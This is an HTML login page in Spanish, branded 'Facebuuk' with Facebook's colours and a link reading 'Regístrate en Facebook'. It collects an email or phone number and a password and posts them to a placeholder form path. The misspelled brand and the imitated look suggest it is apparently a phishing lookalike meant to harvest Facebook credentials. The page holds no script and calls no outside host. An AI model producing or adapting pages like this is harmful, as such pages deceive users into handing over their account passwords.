<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Página de Inicio de Sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f7f6;
            margin: 0;
            padding: 0;
        }
        .login-container {
            width: 300px;
            margin: 100px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
        }
        .login-container h2 {
            text-align: center;
            color: #1B78F2;
            font-size: 24px;
            margin-bottom: 20px;
        }
        input[type=email], input[type=password] {
            width: 100%;
            height: 40px;
            margin-bottom: 25px;
            border-radius: 5px;
            border: 1px solid #ddd;
            padding-left: 10px;
        }
        input[type=submit] {
            width: 100%;
            background-color: #1B78F2;
            color: #fff;
            border: none;
            padding: 12px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-container p {
            text-align: center;
            color: #777;
            font-size: 14px;
        }
        .login-container p a {
            color: #1B78F2;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Facebuuk</h2>
        <form action="/submit-your-login-form" method="post">
            <label for="email">Correo electrónico o número de teléfono</label>
            <input type="email" id="email" name="email" required>
            <label for="password">Contraseña</label>
            <input type="password" id="password" name="password" required>
            <input type="submit" value="Iniciar sesión">
        </form>
        <p><a href="#">¿Olvidaste tu cuenta?</a> | <a href="#">Regístrate en Facebook</a></p>
    </div>
</body>
</html>
